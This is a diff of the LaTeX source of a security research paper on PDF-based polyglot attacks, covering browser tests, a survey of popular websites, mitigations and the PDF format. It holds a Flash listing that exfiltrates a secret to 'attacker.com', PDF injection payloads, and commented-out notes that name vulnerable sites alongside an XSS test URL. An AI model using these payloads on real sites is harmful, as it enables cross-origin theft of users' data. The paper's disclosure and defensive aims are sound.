+scenario in Section~\ref{sec:smuggling}, rather than the syntax injection scenario.
+
+\begin{lstlisting}[label=lst:flash-pdf, caption=Flash code for communication]
+package {
+  import flash.net.*;
+  import flash.display.Sprite;
+  public class Secret extends Sprite {
+    var u:String;
+    var r:URLRequest;
+    var l:URLLoader;
+    public function Secret() {
+      u = 'vulnerable.com/secret';
+      r = new URLRequest(u);
+      l = new URLLoader(r);
+
+      l.addEventListener('complete', 
+        function():void {
+          u = 'attacker.com/?' + r.data;
+          r = new URLRequest(u);
+          l = new URLLoader(r);
+        });
+    }
+  }
+}
+\end{lstlisting}
+
+Cross-origin communication in Flash adheres to the same-origin policy. However, this is not a restriction, since
+ Flash also supports cross-origin communication via  
+cross-origin resource sharing. Using CORS, a web server can relax the SOP to allow access to specified content.
+%As mentioned, the embedded Flash file inherits the origin of the document.
+An attacker can set an allow-all cross-origin policy, such as in Listing~\ref{lst:crossdomain}, 
+that open up for two way communication.
+
+\begin{lstlisting}[label=lst:crossdomain, caption=Allow-all crossdomain.xml]
+<?xml version="1.0"?>
+<cross-domain-policy>
+  <allow-access-from domain="*" />
+</cross-domain-policy>
+\end{lstlisting}
+
+%\subsubsection{The attacker}
+%There are a number of ways to communicate with the attacker, either directly 
+%via the embedding page or through the attackers server. As mentioned previously, 
+%many methods trigger page navigation in the browser. This will result in a 
+%noticeable change in the victims browser. While it fulfills the purpose of 
+%leaking information, an attacker can use more covert methods of communication
+%to refrain from alerting the victim.
+
+%\paragraph{Fragment identifier}
+%The methods that navigate the browser can still be used for a somewhat covert 
+%communication with the attacker. Navigating to the same page with a different 
+%fragment identifier will not reload the page. Embedding the information in the fragment 
+%identifier of the URL of the embedding website, creates a one-way communication 
+%channel from the document to the page. Since the fragment identifier is visible 
+%in the address field of the browser, an alert user would notice it changing.
+
+%\paragraph{PostMessage}
+%The PDF plugin includes an API for communicating directly with the page in 
+%which it is embedded. The document can send messages to the page using 
+%the hostContainer.postMessage method. The page registers a handler to receive 
+%the event and is also able to post messages back to the document.
+%This two way communication is not visible to the victim.
+
+%\paragraph{Embedded Flash}
+
+%3 pages 
+\section{Evaluation}
+\label{sec:eval}
+
+This section details the evaluation performed to investigate the persistence of 
+the vulnerabilities from Section~\ref{sec:vuln}. The evaluation covers various 
+instances of affected components, such as browsers and PDF interpreters, 
+content sanitization filter, and a study of the Alexa top 100 websites.
+
+\subsection{Instances}
+
+To better understand how this problem presents itself, a comparison of browser and reader instances 
+is presented. We compare all major browsers and two of the most common readers.
+
+\subsubsection{Readers}
+\label{sec:readers}
+Section~\ref{sec:vuln} focuses on the Adobe PDF Reader as the attack surface, 
+due to its standing as the most commonly used reader. To give a comparison, the 
+Google Chrome built-in PDF reader, was selected as it is the default reader to 
+user of the browser.
+
+As mentioned in Section~\ref{sec:cross}, the browser rely on the reader plug-in to 
+implement correct security measures, in order to prevent cross-domain leakage. 
+Unlike Adobe Reader, the Chrome browser built-in PDF reader refuses to render 
+content that was served with an inappropriate MIME-type if the content is 
+delivered across origins. This effectively prevents the attacks in Section~\ref{sec:vuln}.
+If the Chrome browser is configured to use the Adobe Reader plug-in, it will 
+behave the same as in other browsers and the content will be interpreted as PDF.
+
+\subsubsection{Browsers}
+
+The behavior of cross-domain embedding of PDF resources is studied in the major 
+browsers, i.e., Firefox, Safari, Opera, Google Chrome and Internet Explorer. 
+The study shows that all major browsers are susceptible to the attacks outlined 
+in Section~\ref{sec:vuln}, with some minor differences detailed below and summarized in Table~\ref{tab:comparison}.
+
+\paragraph{Firefox, Safari and Opera}
+The browsers, Firefox, Safari and Opera, are all susceptible to the attacks outlined as 
+per Section~\ref{sec:vuln}, without any restrictions or modifications.
+
+\paragraph{Internet Explorer}
+Microsoft's browser, Internet Explorer, is susceptible to the attacks. However, 
+it seems to only support embedding of PDF documents using the \emph{embed} tag. 
+This is not a major obstacle in exploiting the vulnerability, as the embed and 
+object tags are interchangeable in this respect.
+
+\paragraph{Google Chrome}
+Google's browser, Chrome, has built-in support for displaying PDF documents. 
+The built-in PDF reader is used by default by the browser, unless it has been 
+explicitly disabled by the user. Certain complex PDF documents can not be 
+handled by the built-in reader. The built-in reader will then prompt the user 
+to open the document in Adobe Reader. As previously noted in Section~\ref{sec:readers}, the built-in reader 
+is not vulnerable to attacks. Hence, Chrome is only susceptible when the Adobe 
+Reader plug-in is used to render the document.
+
+\begin{table}[h!]
+\begin{tabular}{l|c|c|c}
+& object & embed & Adobe is default \\ \hline
+Firefox & Yes & Yes & Yes \\ \hline
+Chrome & Yes & Yes & No \\ \hline
+Safari & Yes & Yes & Yes \\ \hline
+Opera & Yes & Yes & Yes \\ \hline
+Internet Explorer & No & Yes & Yes %\\ \hline
+\end{tabular}
+\caption{Comparison of browsers}
+\label{tab:comparison}
+\end{table}
+%\subsection{Bypassing content filters}
+
+%\subsubsection{Server-side upload filters}
+
+%As discussed in Section~\ref{sec:cross} server-side content filters that 
+%validate files based on content type are not equipped to handle polyglot 
+%content. For polyglot content, specialized filters are required that analyze 
+%the content based on all considerable interpretations of the content. No such 
+%filters were encountered in this study.
+
+%\subsubsection{Cross-site scripting filters}
+%\todo{install NoScript?}
+%This effectively bypasses any cross-site scripting filters such as NoScript or
+%filters built into browsers. Since the Reader plug-in handles the response, the
+%browser never gets to see the content
+
+%\subsubsection{Context sensitive filters}
+
+%Context sensitive cross-site scripting filters, that remove or encode characters
+%Clever filters that adapt their filtering to the context in which the user
+%content is included. Basically filters that allow input that do not form harmfulHTML.
+
+% Don't want to claim something I have no basis for..
+
+\subsection{Alexa top 100}
+We have conducted two
+studies to evaluate the prevalence of the problem on popular sites, 
+covering the Alexa top 100 websites. Because of their dominance 
+on the web, these websites are also the most exposed to security threats.
+The first study covers PDF-based polyglot attacks using syntax injection as the 
+infiltration method; the second covers content smuggling.
+%It does not involve polyglot attacks based on content smuggling, as 
+%potential targets generally require authentication before submitting content.
+We refrain from mentioning names of individual websites to prevent exploitation 
+before the issues have been properly dealt with. Neither do we want to disclose 
+these websites as particularly vulnerable. We are in contact with the teams responsible for the websites to help
+mitigate the vulnerabilities.
+
+\paragraph{Syntax injection}
+The study is based on supplying the websites with the benign minimal PDF in 
+Listing~\ref{lst:minimal-pdf}, and examining the corresponding responses to this input.
+The sample contains the essential keywords and tokens required to perform a syntax 
+injection based polyglot attack. If these tokens pass through unaltered, the website is 
+considered vulnerable. The process has been conducted manually and only input 
+parameters on publicly accessible pages, those that do not require authentication, 
+were tested. Considering that most inputs are available only to authenticated 
+users, the results suggests that more websites are likely vulnerable in input that do
+require authentication.
+
+The conclusion is 
+that nine websites out of the hundred apply insufficient content filtering with 
+respect to the PDF format. Out of the nine found to be vulnerable; five were 
+susceptible to PDF based polyglot attacks, and four applied 
+insufficient content filtering, but the input was reflected in a way that 
+prevented exploitation, e.g. the header appeared after 1024 bytes.
+%
+%, which have the potential of compromising the 
+%confidentiality and integrity of the website's users.
+%
+
+Three of the five vulnerable web sites could also be determined to be vulnerable to 
+traditional XSS attacks in the same input parameters. 
+The remaining two web sites found susceptible only to polyglot attacks and not XSS attacks
+are of particular interest since they employ proper measures to protect 
+against XSS attacks, and yet fall short in defeating this new breed of attacks.
+
+\begin{enumerate}
+\item The first web site reflected user input in an inline  
+JavaScript context, inside a string. To prevent cross-site scripting in this 
+context, the following measures were taken: the JavaScript string delimiters 
+and the backslash character were properly escaped, and the 
+string "$<$/script$>$" was removed. These measures are sufficient to protect against XSS attacks, 
+but do not prevent an attacker 
+from injecting valid PDF syntax.
+\item The second website reflected the user input in an HTML-comment context. 
+The only measure taken to prevent XSS attacks in this context was removing any 
+occurrence of the character sequence "--$>$". Again, while successfully preventing 
+XSS attacks, this measure is ineffective in preventing an attacker from injecting PDF syntax.
+\end{enumerate}
+
+\paragraph{Content smuggling}
+Further, a smaller study was conducted, not covering the full Alexa top 100, but 
+targeting popular cloud storage services. 
+This study is based on polyglot content being uploaded to the service and 
+subsequently analyzed to determine which origin it was served under. Two major 
+enterprise cloud storage services were found to be susceptible to attacks. Both service makes an effort to
+follow current best practices, see Section~\ref{sec:smuggling-mitigation}, but fail to cover scenarios for content upload.
+
+The first service serves almost all uploaded content from a sandboxed origin; the exception being the user's 
+avatar image that are served under the sensitive origin. An attacker could 
+upload a specially crafted avatar image that, when embedded as PDF on the attackers 
+web site, can access and modify the contents of the victim's cloud storage.
+
+The second service lets the user publish a public link to an HTML 
+representation of the content. The content is served under the sensitive origin 
+and is therefore carefully processed to prevent 
+generation of malicious HTML, but fails to take other formats into account.
+A specially crafted file will result in the generation of valid PDF syntax that, when embedded as PDF on the attackers 
+web site, can access and modify the contents of the victim's cloud storage.
+
+We are currently advising both service providers to help mitigate these vulnerabilities.
+
+%Baidu.com (allows <>, but escapes /) 
+%LinkedIn (allows <>, but escapes /) 
+%Soso (allows <>, but escapes /) 
+%Youku (vulnerable to traditional XSS) 
+%Soku (vulnerable to traditional XSS) 
+%alibaba.com (allows <>, but escapes /)
+%about.com (vulnerable to traditional XSS,
+%http://linux.about.com/sitesearch.htm?q=XSS&SUName=--%3E%3Cimg+src=x+onerror=alert%281%29%3E)
+%sogou.com (potential target
+%http://www.sogou.com/web?query=%25PDF+%3C%3C+%2F+%3E%3E&_asf=www.sogou.com&_ast=1349689275&w=01019900&p=40040100&sut=11010&sst0=1349689274528)
+
+%1-2 pages 
+\section{Mitigation}
+\label{sec:mit}
+This section gives advice on various mitigation approaches available for each of the
+affected components, both server-side and client-side. It should be noted that 
+preventing polyglot attacks in the general case is a complex task, as one would 
+need to take all potentially malicious formats in to account. Mitigating instances of 
+polyglot attacks based on particular formats are significantly more straightforward.
+
+Note that although some mitigation discussed below is already in place
+(notably as implemented by the Chrome builtin PDF reader), the state of the art
+is far from being satisfactory. As our paper demonstrates, the
+polyglot attacks are a real threat. It is the paper's main value to
+bring attention to polyglot attacks and the importance of
+mitigation against them.
+
+\subsection{Server-side mitigation}
+
+As a content provider on the Internet today there are precautions that one can 
+take to mitigate this class of vulnerabilities. Which precautions to take depend 
+on the kind of services provided. The mitigation recommendations for syntax 
+injection apply to all services that rely on user input, and the content smuggling
+recommendations apply to services that serve user-supplied files.
+
+\subsubsection{Syntax injection}
+
+%In the case of PDF; always encode tokens related to the PDF 
+%syntax. Generally, hard to ensure that tokens for all potential 
+%file formats are properly encoded without breaking anything.
+
+Preventing syntax injection attacks on the server-side poses severe challenges.
+Even server-side filtering of HTML syntax to prevent cross-side scripting
+attacks has proved difficult due to the many contexts in which JavaScript can be 
+introduced. Filtering all potentially harmful tokens from all formats in which a 
+document may be interpreted is hardly possible.
+
+To prevent PDF-based syntax injection attack, the task is simpler. As discussed in Section~\ref{sec:pdf-injection}, the token-set identified in 
+Section~\ref{sec:pdf-injection}, are essential 
+to create valid PDF syntax. %, namely \emph{'$<$', '$>$', and '/'}.
+Filtering 
+user input to remove or encode these characters effectively mitigates the 
+vulnerability. 
+Luckily, because of the significant overlap with the token-set
+of HTML, many of the contexts where user input can occur are already being protected.
+Special attention is required in contexts are not traditionally filtered for 
+HTML tokens, e.g. JSON.
+
+\subsubsection{Content smuggling}
+\label{sec:smuggling-mitigation}
+The current best-practice recommendation from Google~\cite{Google:ContentHosting} 
+on hosting user-supplied content, is to serve the content from a sandboxed origin that is 
+completely separate, as per SOP, and isolated from the sensitive services. 
+These best-practices successfully prevents content smuggling 
+attacks, as the restrictions of the SOP prevents the content from accessing any sensitive 
+resources in the origin of the web service.
+
+These recommendations comes with a caveat that need to be taken into consideration. Some user supplied 
+content is only meant to be accessible to certain authenticated users, e.g. photos that 
+is only shared with friends. In that case, the service needs to transfer the 
+credentials required to authenticate the user from the sensitive origin to the sandboxed 
+origin, without actually revealing the credentials used in the sensitive origin. 
+Revealing the credentials, e.g. using the same cookies on both origins, defeats 
+the purpose of the sandbox origin entirely. Currently there is no uniform solution 
+to this problem. Some common solutions are encountered: using the hashed 
+credentials of the sensitive origin; or generating public, but obscured, links 
+that are later shared manually.
+
+%\todo{Problem of transferring credentials between domains for services where the content requires authentication}
+
+%Google uses the domain name \emph{googleusercontent.com} to sandbox all the 
+%untrusted user files that their various services provide for their customers.
+
+\subsection{Browser}
+
+Traditionally, browser vendors have allowed the browser to override the 
+MIME-type provided by the server for compatibility reasons. This is a compromise 
+to deal with the situation that the server is confused as to what kind of content it is serving. This compromise 
+has repeatedly shown to lead to security issues. The affected browser vendors 
+can help mitigate this problem by limiting the ways content can be coerced to be 
+interpreted as a particular format.
+
+In the case of PDF-based polyglots, the browser can intervene when there is a 
+mismatch between the content-type provided by the server and the type attribute 
+of the \emph{object} tag. The vulnerability can be mitigated by acknowledging that there can be a potential security issue in 
+interpreting the supplied content in the requested format and alerting the user to this
+threat.
+
+One may argue that the browser is as confused as the originating server as to the 
+actual format of the content, and that the issue would be best resolved by the 
+corresponding plug-in.
+
+\subsection{Interpreter}
+
+As a general rule of thumb, the interpreter must at the very least alert the user if the served 
+content-type differs from the expected. A preferred alternative is to 
+not attempt to interpret the content at all. This holds true especially when 
+the served content-type is well known and radically different from that which 
+the interpreter is designed for.
+
+As for the PDF file format, the underlying design decisions have led to the 
+current parsing being very relaxed, even with respect to the specification. 
+Making the parsing more strict and enforcing many of the specified requirements 
+will reduce the attack surface. However, it is not sufficient for complete 
+mitigation. As discussed in Section~\ref{sec:pdf-based-polyglots} the PDF format is a container format; designed to 
+embed syntax from other files. Even when parsing strictly according to 
+the specification, it is a simple task to create a PDF-based polyglot.
+
+%1 page 
+\section{Related work}
+\label{sec:related}
+Backes et al.~\cite{Backes+:SP07} explore the power of the PostScript
+language. PostScript allows executable content and access to sensitive
+information from the environment such as the user id. This work
+demonstrates how to compromise reviewer anonymity in a peer-reviewing
+process by maliciously crafting a PostScript document.
+
+As discussed in Section~\ref{sec:cross}, 
+GIFAR~\cite{Brandis:GIFAR} is based on polyglots that combine the GIF and JAR (Java
+archive) formats. The former is used as benign and the latter as
+malicious to bypass SOP. The Java virtual machine vendors have since
+then mitigated these attacks by patching the virtual machine to be
+more conservative on the format of the executed files.
+
+PDFAR~\cite{PDFAR:09} polyglots combine the PDF and JAR formats, where
+PDF serves as benign and JAR serves as malicious. Such a polyglot is
+possible due to the liberty of the requirements on the headers of PDF
+files. Mitigation against GIFAR attacks in the Java virtual machine
+effectively applies to PDFAR attacks.
+
+Nagra~\cite{Nagra:09} demonstrates GIF/JavaScript polyglots by the
+same file being interpreted as a script and as an image and
+informally discuses possible security implications.
+
+Barth et al.~\cite{Barth+:SP09} focus on security implications of
+content sniffing by browsers. They present content-sniffing XSS
+attacks by crossbreeding HTML with other formats like PostScript. They
+show attacks on real systems like HotCRP, where an uploaded conference
+paper in the PostScript format is interpreted as malicious HTML by the
+browser. They also propose a content-sniffing algorithm that does not
+suffer that helps defending against these class of attacks while
+maintaining compatibility.
+
+Sundareswaran and
+Squicciarini~\cite{Sundareswaran:Squicciarini:CEAS10,Sundareswaran:Squicciarini:SecureComm10} discuss image
+repurposing for GIFAR attacks. They present the AntiGifar tool for
+client-side protection. AntiGifar models the benign behavior of a user
+by a control-flow graph and detects possible anomalies when the
+interactions of the user and browser with the web site deviate from
+the control-flow model.
+
+As mentioned in Section~\ref{sec:cross}, Huang et
+al.~\cite{Huang+:CCS10} study an HTML/CSS attack. This attack injects
+fragments of CSS syntax in a HTML document, thereby making it a
+HTML/CSS polyglot. The error-tolerant parsing of style sheets allow
+the polyglot to parsed as valid CSS. The capabilities of CSS provide
+trivial cross-origin leakage. As discussed earlier, the paper's
+defense technique has been adopted by all major browsers, which
+implies that the attacks outlined in their paper are now ineffective.
+
+Wolf's OMG WTF PDF presentation~\cite{Wolf:CCC10} is one of the 
+inspirations for our work. The presentation explores the liberty
+of the PDF format. In addition, it highlights that PDF interpreters
+often disregard the specification demands. This is particularly
+relevant as it allows crossbreeding PDF with such
+formats as ZIP and EXE.
+
+Heiderich et al.~\cite{Heiderich+:CCS11} explore the Scalable Vector
+Graphics (SVG) format. They discover attacks that allow SVG files,
+embedded via the \emph{img} tag, to run arbitrary JavaScript. 
+One of the
+attack vectors involves an SVG/HTML polyglot
+that behaves differently depending on the context in which it is
+accessed. When included in the \emph{img} tag, the file is interpreted as SVG,
+whereas when it is accessed directly it is interpreted as malicious HTML.
+
+%1 page 
+\section{Conclusions}
+\label{sec:conc}
+We have put a spotlight on a new breed of attacks that smuggle
+malicious payload formatted as benign content. We have identified
+polyglots as the root cause for this class of attacks. In a systematic
+study, we have characterized the necessary ingredients for
+polyglot-based attacks on the web and arrive at the PDF format to be
+particularly dangerous. Our empirical studies in the web setting
+confirm vulnerabilities in the current content filters both in the
+server side and in browsers, as well as in the PDF interpreters.
+These vulnerabilities open up for insecure communication across
+Internet origins and allow attacking web sites from the top 100 Alexa
+list. To mitigate the attacks, we suggest general measures against
+polyglot-based attacks.  These measures are a combination of
+protection on the server side, in browsers, and in content
+interpreters such as PDF readers.
+
+The affected vendors have been made aware of the
+vulnerabilities. These vendors include Adobe (notified instantly after
+discovering the security implications of polyglot PDFs)
+%in late 2009
+and the major browser vendors. We have also contacted the vulnerable
+web sites from the top 100 Alexa list.
+%
+Following responsible disclosure, we refrain from providing the names of the vulnerable web sites.
+
+Future work includes identification of further formats vulnerable to
+polyglot-based attacks. Versatile media content formats such as the
+Windows Media Video format are of particular concern because of their
+potential for executing scripts. Further investigation of the PDF
+format might lead to enhanced possibilities to bypass content filters
+by alternative character sets.
+
+We also plan to extend the empirical study to popular services like
+HotCRP, Europass CV, and arXiv.org that allow uploading PDF
+documents. Authorization is pending for an in-depth security study of
+a major conference management system.
+
+%1-2 pages 
+\bibliographystyle{plain}
+\bibliography{literature}
+
+\appendix
+
+\section{Sample PDF file}
 \begin{lstlisting}[label=lst:sample-pdf, caption=Sample PDF file]
@@
 
-% header
-\subsubsection{Header}
-The header consists of the string "\%PDF-" followed by a version number. 
-The version is denoted by a 
-major and a minor version number of the form "\emph{M.m}". Because the version can 
-be specified elsewhere, the version number is not required to be part of the 
-header.
-
-% objects
-\subsubsection{Objects}
-Objects can be direct or indirect, the difference being that indirect objects 
-has labels which are used for referring to the object from another object. Object 
-labels are numbered and begin with the string "\emph{N n} obj", where "N" is the object number and "n" is the 
-revision number. Similarly object references are of the form "\emph{N n} R".
-The label is optionally ended with the keyword "endobj".
-
-There are eight basic types of basic objects; booleans, integers, strings, names, 
-arrays, dictionaries, streams and the null object. For the intents and purposes 
-of this article, we will focus on the string, dictionary, name and stream objects.
-
-% string objects
-\paragraph{String objects}
-There are two types of strings; literal and hexadecimal. Literal strings are 
-enclosed by the "(" and ")" characters. Any character can occur in a literal 
-string, even parentheses if they are balanced, e.g. a matching closing 
-parenthesis for every opened parenthesis. In hexadecimal strings 
-each character is represented by its corresponding hexadecimal value, enclosed 
-by the "$<$" and "$>$" characters.
-
-% dictionary objects
-\paragraph{Dictionary objects}
-Dictionary objects are a name-value map delimited by the "$<<$" and "$>>$" 
-tokens. The names are name objects and the values are objects of any type.
-% name objects
-Name objects begin with the "/" character, followed by a string of non-whitespace 
-characters. Each dictionary has a type, either specified by the "/Type" name or inferred 
-from the context in which it occurs. The type declares which kind of element the 
-dictionary is describing, e.g. a page or an annotation. Dictionaries form the structure of the document by connecting
-objects through references, e.g. relating a page to its contents. %At least one 
-%dictionary is required to build a PDF document. 
-% actions?
-A special type of dictionary describes \emph{actions}. Actions are triggered when a
-certain event occur, such as a file is opened or a page is displayed, and the action 
-dictionary specify how it is handled. Actions can be used to, among other 
-things, go to a specific page, play a sound, execute JavaScript or launch a command.
-
-% stream objects
-\paragraph{Stream objects}
-A stream is an unlimited sequence of bytes. A stream object shall always be indirect and consists of a 
-dictionary, describing the stream, and the associated stream delimited by the 
-"stream" and "endstream" keywords. 
-%
-According to the specification, the stream dictionary shall contain a \emph{Length} 
-name to specify the length of the stream. In practice this can be omitted as 
-long as the delimiting keywords are in place.
-%
-PDF supports encoding of streams, in which
-case the dictionary describe which filters are required to decode the stream.
-
-% cross-reference
-\subsubsection{Cross-reference}
-The cross-reference section is a record of the location of indirect objects 
-within a file. The location is specified as the byte offset from the beginning 
-of the file. The cross-reference section is opened with the "xref" keyword,
-followed by one record for each indirect object. The cross-reference section 
-will be reconstructed if missing and can therefore be omitted.
-
-% trailer
-\subsubsection{Trailer}
-The trailer is composed of a trailer dictionary, a pointer to the cross-reference 
-section and an end-of-file marker. The trailer dictionary is introduced by the 
-"trailer" keyword. 
-%
-\emph{Root} is in practice the only mandatory name in the trailer dictionary, referencing the root of the 
-%
-document structure. The "startxref" keyword is followed by the number of bytes from 
-the beginning of the file to the first cross-reference section. As with the 
-cross-reference section, it can be omitted. The string "\%\%EOF" marks the 
-end-of-file, but can be omitted.
-
-\subsection{PDF-based polyglots}
-\label{sec:pdf-based-polyglots}
-Several design choices in the PDF specification make the format particularly 
-suitable for making polyglots. One such design choice is the error tolerant 
-parser. This is in part motivated by PDF being a container format, 
-%of which the 
-another design choice which implies
-%implication is 
-that a PDF file can, by design, contain foreign syntax that 
-could interfere with the syntax of the file. Another motivation is that PDF 
-files are designed to be both forward- and backward-compatible. Readers 
-implementing an older version of the specification do not recognize new 
-features and behave as if they were not present in the file. 
-%
-The implementation notes of the specification describes some exceptions to the
-requirements of the specification, such as the header can occur 
-anywhere within the first 1024 bytes of the file. This flexibility gives plenty of room for 
-combining with syntax of another format.
-%
-The specification declares many components to be required in a
-PDF file, but as can be seen in Section~\ref{sec:format}, in practice several 
-components can be omitted~\cite{Wolf:CCC10}. The code in Listing~\ref{lst:minimal-pdf} shows the 
-minimal syntax required for a malformed, but valid PDF file.
-%incrementally 
-%updated by appending updated versions of existing objects to 
-%the end of the file. In fact, 
-%and formats. This and the fact that it is designed to be robust against errors,
-%provides us with a format that is powerful, flexible and ideal for creating
-%malicious polyglots.
-
-\begin{lstlisting}[label=lst:minimal-pdf, caption=Minimal PDF file]
-%PDF-
-trailer<</Root<</Pages<<>>>>>>
-\end{lstlisting}
-
-% - Execute JavaScript
-% - Embed flash files
-% - Launch commands
-% - Network requests
-
-Furthermore the PDF format is of particular interest to us because of its 
-many capabilities. Some examples include executing JavaScript, launching commands, 
-and issuing HTTP requests. The HTTP requests are restricted to the origin of the 
-PDF file, and will include any cookies associated with that origin. 
-Adobe Reader also includes a flash 
-runtime to play embedded flash files on systems that do
-not have the Flash runtime installed. %Considering that it might be a conscious decision
-%of the user to refuse a flash player,
-
-%\subsection{Embedded PDF documents}
-
-When a PDF document is embedded in a web page, the corresponding plug-in 
-is executed to render the content. Recall from Section~\ref{sec:cross-origin} 
-that the plug-in is selected based 
-on the MIME-type, either supplied by the server or in the type attribute
-%
-with preference for the later.
-%
-Also recall
-that the browser rely on the plug-in to handle the situation when the MIME-type 
-supplied by the server is inconsistent with the MIME-type of the plug-in.
-In the case of the Adobe Reader plug-in, it disregards the MIME-type
-supplied by the server and will attempt to interpret any content as PDF. 
-Listing~\ref{lst:embed-pdf} shows how 
-arbitrary content can be rendered as PDF format.
-
-\begin{lstlisting}[label=lst:embed-pdf, caption=HTML for embedding PDF content]
-<embed type="application/pdf" 
-src="vulnerable.com/?input=%PDF...">
-\end{lstlisting}
-
-\subsection{Syntax injection}
-\label{sec:pdf-injection}
-As the scenario details in Section~\ref{sec:injection}, the attacker in a syntax 
-injection attack manipulates a vulnerable service to include PDF syntax in existing content, e.g. HTML-documents.
-The PDF syntax is typically injected through user input used by the vulnerable service in the composition of documents.
-%
-An example of a suitable fragment to inject is shown in Listing~\ref{lst:xml-pdf}.
-%
-The content is subsequently 
-embedded in the attackers page as PDF, as exemplified in Listing~\ref{lst:embed-pdf}.
-As mentioned in Section~\ref{sec:pdf-based-polyglots}, the embedded PDF can issue 
-requests to the origin it came from, carrying the cookies associated with that origin.
-These requests allow for the extraction of sensitive user data that can either be 
-communicated back to the attacker, or be leveraged in further attacks.
-
-Thus far, exploitation of vulnerable services have been discussed, excluding the specific 
-conditions under which a service is vulnerable. In order to exploit the 
-vulnerability, the injected syntax must pass through any existing filters 
-unchanged or at least with its semantics preserved. If user input in an 
-HTML-document is not sanitized, any syntax would be unchanged and 
-the service is vulnerable to less sophisticated attacks, e.g. cross-site scripting, 
-therefore sanitized user input is of greater concern.
-%
-Based on the PDF samples in Listings~\ref{lst:minimal-pdf} and~\ref{lst:xml-pdf}, we can derive 
-the set of tokens required to build a PDF. Assuming that alpha-numeric characters 
-pass through a sanitization filter unmodified, the set of tokens is $\{\%, <<, >>, /\}$.
-As can be noted, there is a small but significant overlap with the tokens of HTML, 
-which implies that many websites protected against cross-site scripting attacks 
-are also protected against PDF-based polyglot attacks. One of the problems of 
-filtering input for inclusion in a web page are the many contexts in which the 
-input can be included. A problem made even more complex by the diversity of 
-languages the page contains. Language incompatibilities force context dependent 
-filtering, where the same input is treated differently based on the context in 
-which it is included. In certain contexts angle brackets are often left untouched by filters.
-
-\paragraph{HTML comments}
-No HTML enclosed in comments, "$<$--" and "--$>$", will be rendered, and therefore 
-filters consider this context safe. To prevent input from escaping the comment by 
-injecting an end comment token, certain filters remove any occurrences of "--$>$", 
-but leave the rest of the input untouched. HTML comments are meaningless to PDF, 
-and the result is a valid HTML/PDF polyglot.
-
-\paragraph{JavaScript strings}
-In an in-line JavaScript context, user input is often included in the shape of a 
-JavaScript string, delimited by single or double quotes. In this context only a 
-few characters require encoding, as they can break the string context. Naturally, 
-any single or double quotes need escaping, as well as any carriage return or 
-line feed characters. In the spirit of making minimal changes to the input, 
-certain websites only escape these characters. This is sufficient to prevent cross-site 
-scripting attacks, but fail to protect against PDF-based polyglot attacks.
-
-Not only in-line JavaScript fall short in this regard. JavaScript object notation 
-(JSON) is used in modern websites as a data transport. This is particularly 
-common in websites that provide an API to interact with the offered services.
-JSON encoded information suffer the same problem as in-line JavaScript, thereby
-extending the attack surface further.
-
-\subsection{Content smuggling}
-
-Due to the nature of the PDF, it can without much effort be combined with just 
-about any other format. This provides ample opportunity to create malicious 
-polyglots where PDF is either the benign or the malicious format. Consequently, 
-this significantly expands the attack surface, making it important to take 
-measures to protect against these attacks.
-
-\paragraph{PDF as the benign format}
-%\todo{Services that accept PDFs, PDFs can be used to hide another malicious format}
-Services like job brokers commonly let the user upload a CV in the form of a PDF-file.
-Before such PDF-files are published to recruiters, they are verified to not 
-contain any malicious payload. Such a verification only extends to the PDF format itself.
-An attacker can produce a PDF that is valid and 
-benign, but also a polyglot hiding another malicious format, such as Flash. As 
-described in the content smuggling scenario in Section~\ref{sec:smuggling}, the 
-uploaded PDF file is then embedded on the attacker's web site, but now as the 
-malicious format. Using social engineering, the attacker can persuade 
-the victim to visit the web site.
-
-Creating a PDF/Flash polyglot is no major challenge.
-A proof-of-concept can easily be created by storing the PDF source code as a static string 
-variable in the malicious Flash source code. When compiling Flash, the output is 
-compressed by default to save space, thereby obfuscating the PDF source code. However, tools exist 
-that decompress the Flash files, which restores the plain PDF code.
-
-\paragraph{PDF as the malicious format}
-As detailed in the content smuggling scenario in Section~\ref{sec:smuggling}, the 
-attacker uploads the PDF polyglot to a vulnerable content hosting service. 
-A server-side verification process will base its verification on the benign formats 
-it expects to receive. The polyglot is designed to verify correctly as the benign format,
-and the verification is likely to miss the malicious PDF components, as it is unaware of the alternate interpretation of the content.
-
-Given the extensive capabilities of the PDF format, exploiting a content smuggling 
-vulnerability with a PDF-based polyglot attack, can be done without much effort.
-To prevent the attack, the 
-verification process have to actively search for and remove PDF specific syntax.
-
-\subsection{PDF payloads}
-%\todo{rewrite section, focus on embedded flash, xxe and code samples}
-%
-As discussed in Section~\ref{sec:payloads}, there are two approaches to exploiting 
-these vulnerabilities; cross-site request forgery, and cross-origin information leakage.
-Both of these require extracting information from the vulnerable service, which is something that can be achieved using the capabilities of the PDF format.
-
-In order to extract information and leak across origins, a communication channel
-is established. PDF documents provide multiple ways of generating HTTP requests; 
-many of which allow cross-origin communication, but are, out of security concerns, only one-way in the sense that 
-the PDF document will never see the result. Therefore, the focus is directed towards 
-two methods that allow bidirectional communication; XML external entities, and embedded Flash. 
- Since the document will retain the 
-origin from which it was served, all 
-requests issued from the document will include any cookies associated with the target origin.
-
-%When embedded in a web page, many of the PDF communication methods utilize
-%the underlying browser to make requests by navigating the browser to the target 
-%URL. This will unload the current page in which the document is embedded. Arbitrary page 
-%navigation is allowed with respect to SOP, since the response is not visible 
-%to the document. Such methods can be used in CSRF attacks, but would 
-%defeat the purpose of requesting information as the document cannot process the 
-%response.
-
-% Cross-origin leaks
-%To leak information across origins, a communication channel is 
-%required between the attacker and the target. PDF provides the necessary means 
-%to mediate this information leakage. The flow of information can be divided into 
-%two steps, extracting information from the target and delivering it to the attacker.
-%Each requiring its own communication methods.
-
-%\subsubsection{The target}
-%There are two methods for a PDF file to communicate with the server it originates from, 
-%both allowing it to read the response: from JavaScript using XML external entities 
-%and from an embedded flash file.
-
-\paragraph{XML External Entities}
-The PDF JavaScript API includes a method to parse XML documents, called 
-XMLData.parse. The XML document being processed may in turn rely on external entities, 
-required for the parsing of the document, which the XML parser will request. The request is 
-bound to the origin of the document, and the response is included in the XML document. 
-The source code of the XML document reflects this response and can be retrieved at a later point. This 
-results in a bidirectional communication channel.
-%
-As the response 
-is included in the XML, the result has to be well-formed XML. This puts a 
-restriction on the content that can be requested using this method. Considering 
-that HTML pages are rarely well-formed this method may be too restricted in practice.
-
-Listing~\ref{lst:xml-pdf} contains an example PDF document that uses XML external 
-entities. Note that the one-way method \emph{getURL} is used to communicate the 
-information back to the attacker. Given the compact size of the example, it is useful for the syntax 
-injection scenario in Section~\ref{sec:injection}, which require injection of 
-small syntax fragments.
-
-\begin{lstlisting}[label=lst:xml-pdf, caption=PDF using XML for communication]
-%PDF-
-1 0 obj<<>>stream
-xml = '<!DOCTYPE foo[<!ENTITY x ' +
